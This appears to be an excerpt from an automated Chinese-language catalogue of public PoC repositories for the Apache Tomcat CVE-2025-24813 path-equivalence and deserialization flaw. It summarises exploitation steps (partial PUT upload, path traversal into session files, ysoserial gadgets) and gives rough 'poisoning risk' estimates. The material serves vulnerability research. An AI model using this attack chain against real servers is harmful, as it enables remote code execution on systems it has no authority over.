1.  **检查Servlet是否可写：** 使用PUT请求向目标URL上传文件，检查HTTP响应状态码，以确定服务器是否允许写入。
2.  **生成ysoserial payload：** 使用ysoserial工具生成反序列化payload，需要指定命令、ysoserial路径和gadget。
3.  **生成Java payload：**  生成一个简单的java文件, 然后通过javac编译为class文件, 再打包为jar文件。
4.  **上传和验证payload：** 上传生成的payload到Tomcat服务器, 利用路径穿越漏洞，覆盖session文件，从而执行代码。

**有效性评估：**

根据搜索结果，CVE-2025-24813漏洞正在被积极利用。POC代码涵盖了漏洞利用的关键步骤，包括写入性验证、payload生成和上传，因此可以认为是有效的，但利用成功与否取决于目标环境是否满足利用条件。

**投毒风险评估：**

通过分析POC代码，发现存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖外部工具ysoserial：**  POC代码依赖于ysoserial工具生成反序列化payload。虽然ysoserial是一个常用的漏洞利用工具，但如果用户下载了被篡改的ysoserial版本，可能会执行恶意代码。虽然POC本身没有直接植入恶意代码，但依赖的外部资源存在被投毒的风险。
2.  **执行任意命令：**  该脚本允许执行任意命令。如果攻击者控制了用户运行脚本的环境，可以修改脚本，执行恶意的系统命令，从而控制目标系统。

综合考虑，该POC代码的投毒风险较低，约为5%。大部分代码是用于漏洞利用，风险主要来源于对外部依赖的信任和对执行环境的控制。


**项目地址:** [u238/Tomcat-CVE_2025_24813](https://github.com/u238/Tomcat-CVE_2025_24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #49

**来源**: [CVE-2025-24813-uzairhaider502_CVE-2025-24813.md](../2025/CVE-2025-24813-uzairhaider502_CVE-2025-24813.md)

# CVE-2025-24813

> 📦 该CVE有 **51** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-24813-137f_Poc-CVE-2025-24813.md](../2025/CVE-2025-24813-137f_Poc-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 开启Partial PUT (默认开启), 应用使用基于文件的session持久化(默认位置), 应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，利用了路径等价性（内部点，例如 `file.Name`）结合启用了写入功能的默认 Servlet 和 Partial PUT 功能。该漏洞可能导致远程代码执行（RCE）、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用方式:**

1.  **前提条件:** 漏洞利用需要满足以下条件：
    *   默认 Servlet 开启写入 (disabled by default).
    *   支持 Partial PUT (enabled by default).
    *   对于RCE，应用需要使用 Tomcat 基于文件的 session 持久化，并且包含一个可以被反序列化攻击利用的库（例如，存在于classpath中的commons-collections）。
    *   对于信息泄露/文件篡改，需要攻击者了解敏感文件的上传目标 URL 位于公共上传目标 URL 的子目录下，且攻击者需要知道上传的敏感文件名，且敏感文件通过partial PUT上传。
2.  **漏洞利用步骤:**
    *   **获取 Session ID:** 攻击者首先需要获取一个有效的 JSESSIONID，可以通过访问 `/index.jsp` 获取，如果无法获取则使用默认值。
    *   **测试 PUT 方法:** 攻击者发送一个 PUT 请求来确认目标服务器是否允许使用 `Content-Range` 进行部分写入。
    *   **生成 Payload:**  攻击者使用 `ysoserial` 或者 Java 代码生成一个恶意的序列化对象。`ysoserial` 通过指定的 gadget（例如 `CommonsCollections6`）来执行命令。也可以生成一个包含恶意命令执行的Java .jar文件。
    *   **上传 Payload:**  攻击者利用路径遍历将 payload 上传到 Tomcat 的 session 目录。例如，`/uploads/../sessions/{JSESSIONID}.session`。
    *   **触发执行:**  攻击者使用包含恶意 JSESSIONID 的请求来访问应用程序。Tomcat 将会反序列化该 session 文件，从而执行攻击者注入的命令。

**有效性:**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞的 POC 代码**有效**。搜索结果中提到了该漏洞已被积极利用。提供的 POC 代码包含利用该漏洞进行 RCE 的 Python 脚本，并提供了详细的利用步骤和参数说明。

**投毒风险:**

评估提供的 POC 代码，投毒风险较低，约为 **10%**。主要考虑因素如下：

*   **代码结构:** 代码结构较为清晰，主要分为获取 Session ID、验证 PUT 方法、生成 Payload 和发送 Payload 等几个模块。
*   **依赖项:**  代码依赖 `ysoserial.jar`，这本身是一个已知的漏洞利用工具，如果攻击者替换了 `ysoserial.jar` 文件，则可能引入恶意代码。此外，java payload方式需要服务器具有java编译环境。
*   **潜在风险:**  `java_payload` 函数中使用 `Runtime.getRuntime().exec(c)` 直接执行命令，如果命令字符串 `cmd` 构造不当，可能会存在命令注入的风险。
*   **作者声明:**  README 文件中包含免责声明，说明该代码仅用于教育目的，这在一定程度上降低了作者进行恶意投毒的可能性。

总的来说，虽然代码本身看起来没有明显的恶意行为，但仍然需要谨慎使用，并确保从可信的来源获取 `ysoserial.jar`，并仔细检查命令字符串，避免引入额外的安全风险。 java payload方式需要服务器具有java编译环境,具有一定局限性。

**项目地址:** [137f/Poc-CVE-2025-24813](https://github.com/137f/Poc-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #2

**来源**: [CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露，文件被篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足特定配置条件，包括启用Default Servlet的写入功能，启用partial PUT支持，存在安全敏感文件上传的目标URL位于公共上传目标URL的子目录中，攻击者已知安全敏感文件的名称，以及安全敏感文件通过partial PUT上传。或者，启用Default Servlet的写入功能，启用partial PUT支持，应用程序使用Tomcat基于文件的会话持久性与默认存储位置，应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息，CVE-2025-24813 涉及 Apache Tomcat 的路径等效问题，可能导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。利用条件包括Default Servlet启用了写入，支持partial PUT，以及应用程序的特定配置。搜索引擎结果显示，该漏洞已被公开并被积极利用。

提供的 POC 代码尝试利用该漏洞。它首先使用 `argparse` 处理目标 URL 参数。然后，它包含一段 base64 编码的 payload，该 payload 是一个经过序列化的 Java 对象，旨在执行命令 `touch /tmp/RCE-success`。  该脚本将解码后的payload保存到`decoded_chain.bin`文件中。 然后，使用 `requests.put` 函数，通过构造包含 'Content-Range' 头部的 PUT 请求，利用 Tomcat 的 partial PUT 功能，将payload上传到目标服务器。PUT请求的目标URL是`TARGET_IP/payload.session`。脚本上传完成后删除临时文件。 最后使用Cookie进行getSession。

**有效性评估：** POC 的有效性取决于目标 Tomcat 服务器是否满足漏洞利用的全部条件。如果 Default Servlet 的写入已启用，并且启用了 partial PUT 支持，并且满足其他条件，则 POC 可能有效。

**投毒风险评估：** 仔细检查提供的 POC 代码，没有发现明显的投毒代码。该代码旨在利用已知的 Tomcat 漏洞，而不是在目标系统上植入后门或执行恶意操作。 代码中包含的base64编码的payload部分是最有可能存在风险的部分，但是payload中的命令是`touch /tmp/RCE-success`，该命令仅仅是创建一个文件，用于验证漏洞是否存在，并非恶意操作。

**利用方式总结：**

1.  **条件确认:** 确认目标 Tomcat 服务器启用了 Default Servlet 的写入功能，并启用了 partial PUT 支持，以及是否满足其他相关条件。
2.  **Payload 生成:**  生成一个恶意 Java 序列化对象，该对象可以执行任意代码，或者读取敏感文件。
3.  **Partial PUT 上传:**  使用 HTTP PUT 请求，通过设置 `Content-Range` 头部，将恶意 payload 分块上传到目标服务器上的特定路径（例如，`payload.session`）。
4.  **触发反序列化：**  Tomcat 尝试反序列化上传的文件，从而触发恶意代码的执行。


**项目地址:** [Alaatk/CVE-2025-24813-POC](https://github.com/Alaatk/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #3

**来源**: [CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md](../2025/CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：默认Servlet开启写入 (默认关闭)，支持Partial PUT (默认开启)，存在安全敏感文件的目标URL是公共上传目标URL的子目录，攻击者知晓敏感文件名，安全敏感文件通过Partial PUT上传，或应用程序使用Tomcat文件会话持久性（默认位置），应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞。该漏洞允许攻击者通过精心构造的包含内部点（file.Name）的文件名，利用默认Servlet中启用的写入功能和Partial PUT支持，进行远程代码执行、信息泄露和恶意内容注入。根据漏洞描述，攻击成功的关键在于Tomcat的配置以及应用程序是否使用了易受攻击的组件。

**有效性：** 从搜索结果来看，该漏洞已被确认存在并且有在野利用。但是，漏洞利用需要满足多个非默认配置条件，因此并非所有Tomcat实例都易受攻击。提供的POC代码 `/tmp/9a20e2370d216dc00af3f4d6145c600e/README.md` 内容过于简单，仅包含CVE编号，并不能直接用于漏洞利用，需要根据具体情况编写特定的利用代码，例如构造恶意的PUT请求。

**投毒风险：** 提供的POC代码非常简单，主要就是包含 CVE-2025-24813 的 README.md 文件。因此，投毒风险很低，但是不排除作者在其他相关文件中隐藏恶意代码的可能性，只是没有在此次提交中呈现，考虑到文件数量极少,故判断存在10%的投毒风险。

**利用方式：** 漏洞利用主要通过以下步骤：

1.  **利用Partial PUT上传恶意文件：** 攻击者构造包含内部点的文件名，并通过Partial PUT请求将其上传到目标服务器。
2.  **绕过路径检查：** 由于路径等价性问题，Tomcat可能无法正确处理包含内部点的文件名，导致绕过路径检查。
3.  **信息泄露/恶意内容注入：** 如果目标是信息泄露或恶意内容注入，攻击者需要知道目标敏感文件的名称和路径，然后通过覆盖或修改该文件来实现目的。
4.  **远程代码执行：** 如果应用程序使用了Tomcat的文件会话持久性，并且包含可用于反序列化攻击的库，攻击者可以利用该漏洞将恶意序列化对象写入会话文件，从而实现远程代码执行。攻击者可能会覆盖session文件，然后触发反序列化。

**总结：** CVE-2025-24813 是一个高危漏洞，但是利用条件较为苛刻。 提供的POC代码过于简单，无法直接用于攻击，需要根据目标环境进行定制。在实际环境中，需要仔细评估Tomcat的配置和应用程序的安全性，以确定是否存在被利用的风险。同时需要关注针对该漏洞的攻击尝试并及时采取缓解措施，例如禁用默认Servlet的写入功能或升级到修复版本。

**项目地址:** [AlperenY-cs/CVE-2025-24813](https://github.com/AlperenY-cs/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #4

**来源**: [CVE-2025-24813-AsaL1n_CVE-2025-24813.md](../2025/CVE-2025-24813-AsaL1n_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危 (取决于配置和利用方式，可能导致RCE、敏感信息泄露或文件内容篡改)

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** RCE需要满足以下条件：writes enabled for default servlet, support for partial PUT, 使用Tomcat文件session持久化默认位置, 应用包含可被反序列化攻击利用的库。信息泄露/内容篡改需要满足以下条件：writes enabled for default servlet, support for partial PUT, security sensitive上传URL是公共上传URL的子目录, 攻击者知道security sensitive文件的名字, security sensitive文件也是通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是一个Apache Tomcat中的路径等价性漏洞，源于对文件名中内部点（'file.Name'）处理不当。根据漏洞描述和搜索结果，此漏洞在特定配置下可能导致远程代码执行（RCE）、信息泄露或恶意内容被添加到上传文件中。

**有效性：**
根据搜索引擎结果和漏洞描述，该漏洞已被积极利用。提供的PoC代码利用了Tomcat的partial PUT特性以及session持久化机制（在满足一定条件下），尝试通过上传恶意序列化数据来实现RCE。

**利用方式：**
1.  **前提条件：**
    *   Tomcat的default servlet需要开启写入功能（默认关闭）。
    *   需要启用partial PUT支持（默认开启）。
    *   （RCE）应用使用Tomcat的文件session持久化，且为默认存储位置。
    *   （RCE）应用包含可被反序列化攻击利用的库，例如存在fastjson, jackson等。
    *   （信息泄露/内容篡改）存在安全敏感文件上传URL是公共上传URL的子目录， 且攻击者知道该敏感文件名。
2.  **攻击步骤：**
    *   攻击者构造一个恶意的序列化对象，对其进行Base64编码（PoC中`-d/--data` 参数）。
    *   攻击者指定目标URL（PoC中`-u/--url` 参数）。
    *   PoC脚本首先向目标URL发送PUT请求，其中`Content-Range`头指定了上传的范围，利用Tomcat的partial PUT特性。
    *   如果服务器返回409状态码，则表示partial PUT已成功处理。
    *   之后，PoC脚本会发送GET请求，并携带包含恶意序列化数据的JSESSIONID cookie（`.{random_str}`）。
    *   Tomcat反序列化session数据，从而触发RCE (如果满足RCE条件)。

**投毒风险：**
分析提供的PoC代码和Readme，可以发现：
*   脚本本身的功能是利用漏洞进行攻击。
*   脚本中没有发现明显的恶意代码，例如植入后门、篡改系统文件等。
*   脚本需要用户提供Base64编码的序列化数据，这意味着攻击者需要自行生成payload，脚本只是负责发送payload。
*   Readme中指明了利用方式及所需条件，较为详细。

因此，该仓库中存在作者隐藏的恶意代码的可能性较低，但不能完全排除。投毒风险评估为 10%。风险主要在于用户可能下载了被篡改过的poc，或者运行了来历不明的payload, 这些payload可能包含恶意行为。

**项目地址:** [AsaL1n/CVE-2025-24813](https://github.com/AsaL1n/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #5

**来源**: [CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露和文件被恶意修改

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (Tomcat 默认支持), 文件会话持久化启用 (context.xml 配置 PersistentManager 和 FileStore), 存在反序列化利用链 (类路径下包含存在漏洞的库)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，该漏洞源于 'file.Name' (内部点) 的处理不当。如果满足以下所有条件，则可能导致远程代码执行，信息泄露或文件篡改：

1.  **DefaultServlet 写入功能启用：** 必须在 `web.xml` 中配置 `readonly=false`，允许 DefaultServlet 写入文件。
2.  **Partial PUT 请求支持：** Tomcat 默认支持分块上传，允许攻击者通过分块上传恶意文件。
3.  **文件会话持久化启用：** 需要在 `context.xml` 中配置 `PersistentManager` 和 `FileStore`，启用基于文件的会话存储。
4.  **存在反序列化利用链：** 类路径下需要包含存在漏洞的库（例如，`commons-collections-3.2.1.jar`），使得攻击者可以通过反序列化漏洞执行任意代码。
5.  **信息泄露/文件篡改的先决条件:** 除了上述条件外，还需要满足：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**利用方式：**

1.  攻击者首先利用 Partial PUT 请求上传一个恶意构造的序列化对象，该对象包含一个反序列化利用链（例如，使用 Commons Collections）。
2.  由于启用了 DefaultServlet 的写入功能，恶意文件可以被写入到 Tomcat 的会话存储目录中。
3.  当 Tomcat 尝试反序列化该会话时，由于存在利用链，攻击者可以执行任意代码。
4. 若目标满足信息泄露/文件篡改的先决条件,攻击者可以通过构造恶意的Partial PUT请求，利用路径等价绕过限制，最终实现信息泄露或者文件篡改

**投毒风险分析：**

该POC代码提供了一个 Docker Compose 文件，用于搭建易受攻击的 Tomcat 环境。该环境配置了必要的组件（DefaultServlet 写入，Partial PUT，文件会话持久化），并且包含了一个 Commons Collections 库，可以用于反序列化攻击。

代码本身看起来是直接了当的漏洞演示。投毒风险较低，但是使用该POC时仍需注意。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的利用代码来看，该漏洞已经确认被利用，并且相关的利用方式和利用条件已经比较清晰。提供的POC代码针对的是 RCE 部分，有效性较高，但成功利用取决于是否满足所有前提条件。

**项目地址:** [B1gN0Se/Tomcat-CVE-2025-24813](https://github.com/B1gN0Se/Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #6

**来源**: [CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence/Partial PUT RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/Partial PUT远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet启用写入(默认禁用)，启用Partial PUT(默认启用)，目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且通过Partial PUT上传敏感文件。RCE还需要应用程序使用Tomcat的文件会话持久性，以及存在可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合启用了写入功能的默认Servlet和Partial PUT功能，可能导致远程代码执行和敏感信息泄露。漏洞利用方式如下：

1.  **信息泄露/内容注入:** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   目标URL是公共上传URL的子目录
    *   攻击者知道敏感文件名
    *   通过Partial PUT上传敏感文件
攻击者可以查看敏感文件或向其中注入恶意内容。

2.  **远程代码执行 (RCE):** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   应用程序使用Tomcat的文件会话持久性，且使用默认存储位置
    *   应用程序包含可利用的反序列化库
攻击者可以通过上传恶意序列化session文件，利用反序列化漏洞执行任意代码。

**有效性：**
根据搜索结果，CVE-2025-24813漏洞存在活跃的利用。PoC代码的README描述了一个基本的利用流程，包括克隆仓库、安装依赖、运行PoC脚本，表明该PoC可能有效，但具体利用成功与否取决于目标环境的配置是否满足漏洞利用条件。PoC的有效性较高，因为搜索结果显示该漏洞正在被积极利用。

**投毒风险：**
分析提供的PoC代码（README.md），投毒风险较低。README.md文件只包含漏洞描述、环境配置、使用方法和免责声明。虽然PoC代码没有直接展示`poc.py`的内容，但是根据描述`poc.py`脚本会提示用户输入目标URL，表明其功能是针对目标进行漏洞验证而非植入后门。当然，`poc.py`本身可能包含恶意代码。在没有查看 `poc.py` 的内容的情况下，预估`poc.py`存在投毒代码的可能性较低，大约10%。主要考虑到以下几点：

*   PoC旨在验证漏洞的存在，而非长期控制目标系统。
*   公开的PoC代码通常会接受安全社区的审查，增加投毒的难度。
*   作者声明仅用于教育和研究目的。

**利用方式总结：**
攻击者利用此漏洞的方式是，首先需要满足前置条件（Default Servlet开启写入、Partial PUT启用等）。然后，通过构造恶意的PUT请求，并利用路径等价，覆盖或者修改敏感文件，实现信息泄露或RCE。RCE场景依赖于反序列化漏洞的利用，需要上传精心构造的恶意序列化数据。

**项目地址:** [CEAlbez/CVE-2025-24813-PoC](https://github.com/CEAlbez/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #7

**来源**: [CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md](../2025/CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 1. 默认Servlet开启了写入 (默认禁用)
2. 支持Partial PUT (默认启用)
3. 应用使用Tomcat基于文件的Session持久化, 使用默认存储位置
4. 应用包含可被反序列化攻击利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用 'file.Name' (内部点) 来实现远程代码执行和/或信息泄露，以及/或通过启用了写入的默认 Servlet 向上传的文件添加恶意内容。

**漏洞利用方式：**
1.  **信息泄露/恶意内容添加：**  如果满足以下条件，攻击者可以查看安全敏感文件或向其中注入内容：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   通过 Partial PUT 上传安全敏感文件。

2.  **远程代码执行：**  如果满足以下条件，攻击者可以执行远程代码：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的会话持久性，并且使用默认的存储位置。
    *   应用程序包含一个可以用于反序列化攻击的库。

**POC分析：**
POC利用脚本`CVE_2025_24813.py`的利用流程大概如下：
1.  检查目标服务器的默认servlet是否开启PUT方法，主要通过PUT请求上传一个文件来判断.
2.  如果目标开启了PUT方法，则会生成一个ysoserial的payload，指定gadget和要执行的命令.
3.  然后将payload上传到`target_url/uploads/../sessions/{session_id}.session`，session_id是由参数指定

**投毒风险分析：**
*   脚本主要功能是漏洞利用，没有发现明显的恶意代码。
*   脚本会生成payload并上传，这个过程可能存在一定风险，但主要取决于执行的命令和payload的内容，而非脚本本身。
*  脚本中存在一些临时文件创建，然后删除的操作，例如`Exploit.java`, `Exploit.class`，这些是payload构造过程中的正常步骤，但如果删除失败，可能会在服务器上留下痕迹。
*  脚本有生成java payload的逻辑，但是java payload的生成是直接拼接字符串，命令在字符串中比较明显，不太容易做手脚。
*  考虑到ysoserial payload本身就可能被认为是具有潜在危害，因此将投毒风险评估为5%。主要是payload本身可能存在的潜在风险。

**结论：**
提供的POC代码看起来是有效的，如果目标环境满足漏洞利用的条件，可以成功执行命令。投毒风险较低，主要风险在于利用过程中生成的payload可能带来的危害。

**项目地址:** [Eduardo-hardvester/CVE-2025-24813](https://github.com/Eduardo-hardvester/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #8

**来源**: [CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md](../2025/CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md)

## CVE-2025-24813-Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 写入已启用默认Servlet,支持部分PUT,针对敏感上传的URL是公共上传URL的子目录,攻击者了解正在上传的安全敏感文件的名称,安全敏感文件也通过部分PUT上传. 或 写入已启用默认Servlet,支持部分PUT,应用程序使用Tomcat基于文件的会话持久化，使用默认存储位置,应用程序包含可能在反序列化攻击中被利用的库

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞（CWE-44）和一个反序列化漏洞(CWE-502)。 根据漏洞库信息和搜索结果，漏洞利用涉及利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 请求处理机制中的缺陷。 

**有效性分析：**
 根据搜索结果，CVE-2025-24813 漏洞已被积极利用。 多个来源（Rapid7, Recorded Future, Akamai, Zscaler, 西オアフ大学, XM Cyber, SonicWall, Esri）证实了这一点。Unit42 的报告也提供了测试该漏洞的信息。 提供的 POC 代码描述简单，是 vulhub 环境的搭建说明，但考虑到其他来源指出漏洞已被积极利用，可以认为存在可用的利用代码。

**投毒风险分析：**
 POC代码仅提供了一个用于搭建vulhub环境的README文档，内容非常简单，只包含 CVE-2025-24813 的 vulhub 环境的 POC 脚本说明。 这种情况下，作者进行恶意代码投毒的可能性很低。 因此，投毒风险评估为1%。

**利用方式分析：**
 根据漏洞描述，存在两种主要的利用方式：
 1. **信息泄露/恶意内容注入：** 如果满足以下所有条件，攻击者能够查看安全敏感文件和/或将内容注入这些文件：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者了解正在上传的安全敏感文件的名称。
    *   安全敏感文件也通过部分 PUT 上传。
 2.  **远程代码执行：** 如果满足以下所有条件，攻击者能够执行远程代码：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   应用程序使用 Tomcat 基于文件的会话持久化，使用默认存储位置。
    *   应用程序包含可能在反序列化攻击中被利用的库。

总而言之，漏洞利用依赖于对 Tomcat 服务器的配置和应用程序的特定环境的利用，包括启用的写入权限、对部分 PUT 请求的支持以及应用程序中存在的潜在反序列化漏洞。

**项目地址:** [Erosion2020/CVE-2025-24813-vulhub](https://github.com/Erosion2020/CVE-2025-24813-vulhub)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #9

**来源**: [CVE-2025-24813-FY036_cve-2025-24813_poc.md](../2025/CVE-2025-24813-FY036_cve-2025-24813_poc.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Tomcat <= 9.0.98, 10.1.0-M1 <= Tomcat <= 10.1.34, 11.0.0-M1 <= Tomcat <= 11.0.2

**利用条件:** 需要启用Default Servlet的写入权限, 支持Partial PUT, 且目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传。或者，需要启用Default Servlet的写入权限, 支持Partial PUT, 应用使用Tomcat基于文件的session持久化，应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813是Apache Tomcat中的一个漏洞，涉及路径等价问题，可能导致远程代码执行（RCE）和信息泄露。根据漏洞库信息和搜索引擎结果，该漏洞的利用涉及以下几个关键点：

1.  **路径等价 ('file.Name' (Internal Dot))**：攻击者可以通过操纵文件路径，绕过安全限制，访问或修改受保护的文件。
2.  **Default Servlet写入权限**：需要启用Default Servlet的写入权限（默认禁用）。
3.  **Partial PUT支持**：需要启用Partial PUT支持（默认启用）。攻击者可以通过分块上传恶意文件，从而绕过某些安全检查。
4.  **特定场景下的RCE**：
    *   如果应用程序使用Tomcat的基于文件的会话持久性，并且包含一个可以被用于反序列化攻击的库，攻击者可以通过上传包含恶意序列化数据的会话文件，执行任意代码。
    *   如果目标URL为公共上传URL的子目录, 攻击者需要知道敏感文件名, 安全敏感文件也通过partial PUT上传，可能导致信息泄露。

**漏洞利用方式：**

1.  **利用路径等价绕过**：攻击者可能利用`file.Name`中的内部点（Internal Dot）来访问或修改受保护的文件。
2.  **Partial PUT攻击**：攻击者通过分块上传恶意文件，例如包含恶意序列化数据的会话文件，到Tomcat服务器上。
3.  **反序列化漏洞利用**：如果应用程序包含可以被用于反序列化攻击的库，攻击者可以使用精心构造的序列化数据，在服务器上执行任意代码。

**POC代码分析：**

提供的POC代码 `CVE-2025-24813-poc.py` 尝试利用该漏洞。它执行以下步骤：

1.  **发送反序列化数据**：使用 `send_request` 函数发送一个base64编码的反序列化数据到Tomcat服务器。该请求使用 `Content-Range` 头，模拟Partial PUT请求。
2.  **触发反序列化**：使用 `send_request_two` 函数，通过设置 `JSESSIONID` cookie，尝试触发反序列化过程。
3.  **验证漏洞**：检查服务器的响应状态码。如果状态码为409（冲突）且`send_request_two`返回1（状态码500），则认为漏洞存在。

**有效性评估：**

